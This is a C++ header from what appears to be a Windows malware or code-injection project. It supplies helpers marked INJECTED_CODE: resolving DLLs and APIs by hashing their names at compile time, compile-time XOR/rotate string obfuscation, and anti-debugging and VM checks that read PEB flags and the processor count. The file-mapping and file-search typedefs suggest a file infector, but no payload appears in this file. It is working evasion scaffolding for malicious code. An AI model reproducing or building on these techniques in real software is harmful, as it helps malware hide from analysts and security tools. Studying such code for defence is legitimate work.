#ifndef _LIBPROC_HPP_
#define _LIBPROC_HPP_

#include <Windows.h>
#include <stdio.h>
#include <winternl.h>
#include "injected.h"
#include "utils.h"

#define HASH_ROT 13   /* Hash rotation (ROTL) */
#define OBF_KEY  0x42 /* Obfuscation key (XOR) */
#define OBF_ROT  5    /* Obfuscation rotation (ROTL) */

#ifdef DEBUG
/**
 * @brief Log a message to the console only if `DEBUG` is defined.
 *
 * @param fmt Message format string
 * @param ... Additional arguments
 *
 * @note `DEBUG` is defined, so this macro prints the message to the console.
 */
#define LOG(fmt, ...)                             \
    do {                                          \
        printf("[DEBUG] " fmt "\n", __VA_ARGS__); \
    }                                             \
    while (0)
#else  // DEBUG
/**
 * @brief Log a message to the console only if `DEBUG` is defined.
 *
 * @param fmt Message format string
 * @param ... Additional arguments
 *
 * @note `DEBUG` is not defined, so this macro does nothing.
 */
#define LOG(fmt, ...) __noop(fmt, __VA_ARGS__)
#endif  // DEBUG

#define NT_CURRENT_TEB() ((PTEB)__readgsqword(FIELD_OFFSET(NT_TIB, Self))) /* Get current TEB */

#define FLG_HEAP_ENABLE_TAIL_CHECK   0x10
#define FLG_HEAP_ENABLE_FREE_CHECK   0x20
#define FLG_HEAP_VALIDATE_PARAMETERS 0x40
#define NT_GLOBAL_FLAG_DEBUG \
    (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS)

EXTERN_C_START

// Windows API function pointer prototypes
/* */
typedef HMODULE(WINAPI *LoadLibraryA_t)(IN LPCSTR lpLibFileName);
typedef int(WINAPI *MessageBoxA_t)(IN HWND hWnd OPTIONAL, IN LPCSTR lpText OPTIONAL,
                                   IN LPCSTR lpCaption OPTIONAL, IN UINT uType);
typedef DWORD(WINAPI *GetModuleFileNameA_t)(IN HMODULE hModule OPTIONAL, OUT LPSTR lpFilename,
                                            IN DWORD nSize);
typedef HANDLE(WINAPI *CreateFileA_t)(IN LPCSTR lpFileName, IN DWORD dwDesiredAccess,
                                      IN DWORD dwShareMode,
                                      IN LPSECURITY_ATTRIBUTES lpSecurityAttributes OPTIONAL,
                                      IN DWORD dwCreationDisposition, IN DWORD dwFlagsAndAttributes,
                                      IN HANDLE hTemplateFile OPTIONAL);
typedef DWORD(WINAPI *GetFileSize_t)(IN HANDLE hFile, OUT LPDWORD lpFileSizeHigh OPTIONAL);
typedef HANDLE(WINAPI *CreateFileMappingA_t)(
    IN HANDLE hFile, IN LPSECURITY_ATTRIBUTES lpFileMappingAttributes OPTIONAL, IN DWORD flProtect,
    IN DWORD dwMaximumSizeHigh, IN DWORD dwMaximumSizeLow, IN LPCSTR lpName OPTIONAL);
typedef LPVOID(WINAPI *MapViewOfFile_t)(IN HANDLE hFileMappingObject, IN DWORD dwDesiredAccess,
                                        IN DWORD dwFileOffsetHigh, IN DWORD dwFileOffsetLow,
                                        IN SIZE_T dwNumberOfBytesToMap);
typedef BOOL(WINAPI *VirtualProtect_t)(IN LPVOID lpAddress, IN SIZE_T dwSize, IN DWORD flNewProtect,
                                       OUT PDWORD lpflOldProtect);
typedef BOOL(WINAPI *FlushViewOfFile_t)(IN LPCVOID lpBaseAddress, IN SIZE_T dwNumberOfBytesToFlush);
typedef BOOL(WINAPI *UnmapViewOfFile_t)(IN LPCVOID lpBaseAddress);
typedef BOOL(WINAPI *CloseHandle_t)(IN HANDLE hObject);
typedef DWORD(WINAPI *GetCurrentDirectoryA_t)(IN DWORD nBufferLength, OUT LPSTR lpBuffer OPTIONAL);
typedef HANDLE(WINAPI *FindFirstFileA_t)(IN LPCSTR lpFileName,
                                         OUT LPWIN32_FIND_DATAA lpFindFileData);
typedef BOOL(WINAPI *FindNextFileA_t)(IN HANDLE hFindFile, OUT LPWIN32_FIND_DATAA lpFindFileData);
typedef BOOL(WINAPI *FindClose_t)(IN OUT HANDLE hFindFile);
typedef HLOCAL(WINAPI *LocalAlloc_t)(IN UINT uFlags, IN SIZE_T uBytes);
typedef HLOCAL(WINAPI *LocalFree_t)(IN HLOCAL hMem);
typedef HANDLE(WINAPI *GetStdHandle_t)(IN DWORD nStdHandle);
typedef BOOL(WINAPI *WriteConsoleA_t)(IN HANDLE hConsoleOutput, IN LPCVOID lpBuffer,
                                      IN DWORD nNumberOfCharsToWrite,
                                      OUT LPDWORD lpNumberOfCharsWritten OPTIONAL,
                                      IN LPVOID lpReserved OPTIONAL);
/* */

/**
 * @brief Get the base address of a DLL by its name hash.
 *
 * @param ullDllNameHash DLL name hash to search for
 * @return Base address of the DLL if found, `NULL` otherwise
 */
INJECTED_CODE HMODULE GetDll(IN CONST ULONGLONG ullDllNameHash);

/**
 * @brief Get the address of a function in a DLL by its name hash.
 *
 * @param pDllBase Base address of the DLL to search in
 * @param ullFuncNameHash Function name hash to search for
 * @return Address of the function if found, `NULL` otherwise
 */
INJECTED_CODE PCVOID GetFunc(IN CONST PCVOID pDllBase, IN CONST ULONGLONG ullFuncNameHash);

EXTERN_C_END

/**
 * @brief Convert a character to uppercase (`constexpr`). Only works for ASCII characters.
 *
 * @param c Character to convert
 * @return Uppercase character
 */
INJECTED_CODE constexpr DWORD my_toupper(IN CONST DWORD c) {
    if (c >= 'a' && c <= 'z') {
        return c & ~0x20;
    }
    return c;
}

/**
 * @brief Update a hash with a character (`constexpr`). Hash is case-insensitive.
 *
 * @param ullHash Hash to update
 * @param dwChar Character to update the hash with
 * @return Updated hash
 */
INJECTED_CODE constexpr ULONGLONG update_hash(IN CONST ULONGLONG ullHash, IN CONST DWORD dwChr) {
    return MY_ROTL64(ullHash, HASH_ROT) + my_toupper(dwChr);
}

/**
 * @brief Calculate the hash of an ANSI string (`constexpr`). Hash is case-insensitive.
 *
 * @param sName ANSI string to hash
 * @return Hash of the string
 */
INJECTED_CODE constexpr ULONGLONG my_strhash(IN LPCSTR sName) {
    ULONGLONG hash = 0;
    while (*sName) {
        hash = update_hash(hash, *sName++);
    }
    return hash;
}

/**
 * @brief Calculate the hash of a Unicode string (`constexpr`). Hash is case-insensitive.
 *
 * @param wsName Unicode string to hash
 * @return Hash of the string
 */
INJECTED_CODE constexpr ULONGLONG my_strhash(IN LPCWSTR wsName) {
    ULONGLONG hash = 0;
    while (*wsName) {
        hash = update_hash(hash, *wsName++);
    }
    return hash;
}

/**
 * @brief Case-insensitive string comparison (strings must be null-terminated).
 *
 * @param s1 First string to compare
 * @param s2 Second string to compare
 * @return `0` if the strings are equal, otherwise the difference
 *         between the first differing characters
 */
INJECTED_CODE static inline int my_stricmp(IN LPCSTR s1, IN LPCSTR s2) {
    while (*s1 && *s2 && my_toupper(*s1) == my_toupper(*s2)) {
        s1++;
        s2++;
    }
    return my_toupper(*s1) - my_toupper(*s2);
}

/**
 * @brief Copy memory from one location to another (buffers must not overlap).
 *
 * @param pDest Destination buffer
 * @param pSrc Source buffer
 * @param szCount Number of bytes to copy
 */
INJECTED_CODE static inline VOID my_memcpy(OUT PBYTE __restrict pDest, IN PCBYTE __restrict pSrc,
                                           IN SIZE_T szCount) {
    while (szCount--) {
        *pDest++ = *pSrc++;
    }
}

/**
 * @brief Copy a null-terminated string from one location to another (buffers must not overlap).
 *
 * @param sDest Destination buffer
 * @param sSrc Source buffer
 * @return Pointer to the end of the destination string
 */
INJECTED_CODE static inline LPSTR my_strcpy(OUT LPSTR __restrict sDest, IN LPCSTR __restrict sSrc) {
    while ((*sDest++ = *sSrc++))
        ;
    return sDest;
}

/**
 * @brief Concatenate two null-terminated strings (destination buffer must have enough space,
 * and buffers must not overlap).
 *
 * @param sDest Destination buffer
 * @param sSrc Source buffer
 * @return Pointer to the start of the appended string in the destination buffer
 */
INJECTED_CODE static inline LPSTR my_strcat(IN OUT LPSTR __restrict sDest,
                                            IN LPCSTR __restrict sSrc) {
    while (*sDest) {
        sDest++;
    }
    my_strcpy(sDest, sSrc);
    return sDest;
}

/**
 * @brief Append a character to a null-terminated string (destination buffer must have enough
 * space).
 *
 * @param sDest Destination buffer
 * @param cChr Character to append
 * @return Destination buffer (pointing to the start of the appended string)
 */
INJECTED_CODE static inline LPSTR my_strappend(IN OUT LPSTR __restrict sDest, IN CONST CHAR cChr) {
    while (*sDest) {
        sDest++;
    }
    *sDest++ = cChr;
    *sDest = '\0';
    return sDest;
}

/**
 * @brief Get the filename from a path (last component after the last backslash).
 *
 * @param sPath Path to get the filename from
 * @return Pointer to the filename (in the original path)
 */
INJECTED_CODE static inline LPCSTR my_getfilename(IN LPCSTR __restrict sPath) {
    LPCSTR sName = sPath;
    while (*sPath) {
        if (*sPath++ == '\\') {
            sName = sPath;
        }
    }
    return sName;
}

INJECTED_CODE static inline SIZE_T my_strlen(IN LPCSTR sStr) {
    SIZE_T szLen = 0;
    while (*sStr++) {
        szLen++;
    }
    return szLen;
}

/**
 * @brief Check if the current process is being debugged.
 *
 * @return `true` if the process is being debugged, `false` otherwise
 *
 * @note This is a simple heuristic that checks some flags in the PEB: `BeingDebugged`,
 *       `NumberOfProcessors`, and `NtGlobalFlag`.
 */
INJECTED_CODE static inline bool being_debugged() {
    CONST PCPEB pPeb = NT_CURRENT_TEB()->ProcessEnvironmentBlock;
    CONST DWORD dwNbProcessors = *(PDWORD)((PCBYTE)pPeb + 0xB8);
    CONST DWORD dwNtGlobalFlag = *(PDWORD)((PCBYTE)pPeb + 0xBC);

    // Assume that a machine with 1 or 2 processors is a VM
    return pPeb->BeingDebugged || (dwNtGlobalFlag & NT_GLOBAL_FLAG_DEBUG) || dwNbProcessors <= 2;
}

/**
 * @struct Hash
 * @brief Container for a compile-time hash value.
 *
 * @tparam hash Hash value
 *
 * @note Use `STRHASH` to generate a compile-time hash value from a string.
 */
template <ULONGLONG hash>
struct Hash {
    static constexpr ULONGLONG hash = hash;  // Hash value, calculated at compile-time
};

#define STRHASH(_s) (Hash<my_strhash(_s)>::hash) /* Generate a compile-time hash from a string */

/**
 * @brief Obfuscate a single byte.
 *
 * @param b Byte to obfuscate
 * @return Obfuscated byte
 */
INJECTED_CODE static inline constexpr CHAR obfuscate_byte(IN CONST BYTE b) {
    return MY_ROTL8(b ^ OBF_KEY, OBF_ROT);
}

/**
 * @brief Deobfuscate a single byte.
 *
 * @param b Byte to deobfuscate
 * @return Deobfuscated byte
 */
INJECTED_CODE static inline constexpr BYTE deobfuscate_byte(IN CONST CHAR b) {
    return MY_ROTR8(b, OBF_ROT) ^ OBF_KEY;
}

/**
 * @struct Obfuscated
 * @brief Compile-time obfuscated string.
 *
 * @tparam N Size of the obfuscated string (including null terminator)
 *
 * @note Use `DECLARE_OBFUSCATED` to declare an obfuscated string and its deobfuscator.
 * @note Use `DEOBF` to get the deobfuscator for an obfuscated string.
 */
template <SIZE_T N>
struct Obfuscated {
    CHAR data[N];                            // Obfuscated string data
    static constexpr SIZE_T size = N;        // Size of the string (including null terminator)
    static constexpr SIZE_T length = N - 1;  // Length of the string (excluding null terminator)

    /**
     * @brief Constructor for the obfuscated string. Everything is done at compile-time.
     *
     * @param _data String to obfuscate (LPCSTR)
     */
    INJECTED_CODE consteval Obfuscated(IN CONST CHAR (&_data)[N]) {
        for (SIZE_T i = 0; i < N; ++i) {
            data[i] = obfuscate_byte(_data[i]);
        }
    }
};

/**
 * @struct ObfuscatedBytes
 * @brief Compile-time obfuscated bytes (without null terminator).
 *
 * @tparam N Size of the obfuscated data
 */
template <SIZE_T N>
struct ObfuscatedBytes {
    CHAR data[N - 1];                        // Obfuscated bytes
    static constexpr SIZE_T size = N - 1;    // Size of the data
    static constexpr SIZE_T length = N - 1;  // Length of the data

    /**
     * @brief Constructor for the obfuscated string. Everything is done at compile-time.
     *
     * @param _data Null-terminated string to obfuscate (LPCSTR); the null terminator is removed
     */
    INJECTED_CODE consteval ObfuscatedBytes(IN CONST CHAR (&_data)[N]) {
        for (SIZE_T i = 0; i < N - 1; ++i) {
            data[i] = obfuscate_byte(_data[i]);
        }
    }
};

/**
 * @struct Deobfuscator
 * @brief Deobfuscator for an obfuscated string.
 *
 * @tparam N Size of the obfuscated string (including null terminator)
 *
 * @note Use `DECLARE_OBFUSCATED` to declare an obfuscated string and its deobfuscator.
 * @note Use `DEOBF` to get the deobfuscator for an obfuscated string.
 */
template <SIZE_T N>
struct Deobfuscator {
    CHAR data[N];                            // Deobfuscated string data
    static constexpr SIZE_T size = N;        // Size of the string (including null terminator)
    static constexpr SIZE_T length = N - 1;  // Length of the string (excluding null terminator)

    /**
     * @brief Constructor for the deobfuscator. String is deobfuscated at runtime.
     *
     * @param _data Obfuscated string data (LPCSTR)
     */
    INJECTED_CODE Deobfuscator(IN CONST CHAR (&_data)[N]) {
        for (SIZE_T i = 0; i < N; ++i) {
            data[i] = deobfuscate_byte(_data[i]);
        }
    }

    /**
     * @brief Constructor for the deobfuscator. String is deobfuscated at runtime.
     *
     * @param obf Obfuscated string
     */
    INJECTED_CODE Deobfuscator(IN CONST Obfuscated<N> &obf) : Deobfuscator(obf.data) {}

    /**
     * @brief Implicit conversion to LPCSTR (CONST CHAR*).
     *
     * @return Deobfuscated string data
     */
    INJECTED_CODE operator LPCSTR() const {
        return data;
    }
};

#define DEOBF(_name) (_name##_deobf) /* Get the deobfuscator for an obfuscated string */

#define DEOBF_BYTES(_name) (&DEOBF(_name).data) /* Deobfuscate an obfuscated byte string */

/**
 * @brief Declare an obfuscated null-terminated string and its deobfuscator.
 *
 * @param _name Name of the obfuscated string variable
 * @param _data Null-terminated string data to obfuscate (LPCSTR/LPCWSTR)
 *
 * @note Use `DEOBF` to get the deobfuscator for the obfuscated string.
 */
#define DECLARE_OBFUSCATED(_name, _data)                      \
    INJECTED_VAR static CONST auto _name = Obfuscated(_data); \
    CONST auto DEOBF(_name) = Deobfuscator(_name);

/**
 * @brief Declare an obfuscated byte string and its deobfuscator (null terminator is removed).
 *
 * @param _name Name of the obfuscated byte string variable
 * @param _data Null-terminated byte string data to obfuscate (LPCSTR)
 *
 * @note Use `DEOBF` to get the deobfuscator for the obfuscated byte string.
 */
#define DECLARE_OBFUSCATED_BYTES(_name, _data)                     \
    INJECTED_VAR static CONST auto _name = ObfuscatedBytes(_data); \
    CONST auto DEOBF(_name) = Deobfuscator((_name).data);

/**
 * @brief Get the base address of a DLL by its name.
 *
 * @param _name Name of the DLL
 * @return Base address of the DLL if found, `NULL` otherwise
 *
 * @warning Name must be a bare string, without quotes.
 * @note Name is converted to wide string and hashed at compile-time (case-insensitive).
 */
#define GET_DLL(_name) GetDll(STRHASH(_CRT_WIDE(#_name)))

/**
 * @brief Get the address of a function in a DLL by its name.
 *
 * @param _base Base address of the DLL
 * @param _name Name of the function
 * @return Address of the function if found, `NULL` otherwise
 *
 * @warning Name must be a bare string, without quotes.
 * @warning There must be a typedef for the function pointer type with `_t` suffix.
 * @note Name is hashed at compile-time (case-insensitive).
 */
#define GET_FUNC(_base, _name) (_name##_t) GetFunc(_base, STRHASH(#_name))

static consteval BYTE HexCharValue(IN CONST CHAR c) {
    if (c >= '0' && c <= '9') {
        return c - '0';
    }
    else if (c >= 'A' && c <= 'F') {
        return c - 'A' + 10;
    }
    else if (c >= 'a' && c <= 'f') {
        return c - 'a' + 10;
    }
    throw "Invalid hex character";
}

// Define a compile-time hex string that gets converted to a byte array
template <SIZE_T N2, SIZE_T N = (N2 - 1) / 2>
struct HexString {
    static_assert(N2 % 2 == 1, "Invalid hex string length");

    CHAR data[N];                        // Byte array data
    static constexpr SIZE_T size = N2;   // Size of the hex string (including null terminator)
    static constexpr SIZE_T length = N;  // Length of the byte array

    /**
     * @brief Constructor for the hex string. Everything is done at compile-time.
     *
     * @param _data Null-terminated hex string to convert (LPCSTR); the null terminator is ignored
     */
    consteval HexString(IN CONST CHAR (&_data)[N2]) {
        if (_data[N2 - 1] != '\0') {
            throw "Hex string must be null-terminated";
        }
        if constexpr (N2 % 2 == 0) {
            throw "Invalid hex string length";
        }

        BYTE val;
        for (SIZE_T i = 0; i < N; ++i) {
            val = HexCharValue(_data[i * 2]) << 4;
            val |= HexCharValue(_data[i * 2 + 1]);
            data[i] = val;
        }
    }
};

#endif  // _LIBPROC_HPP_
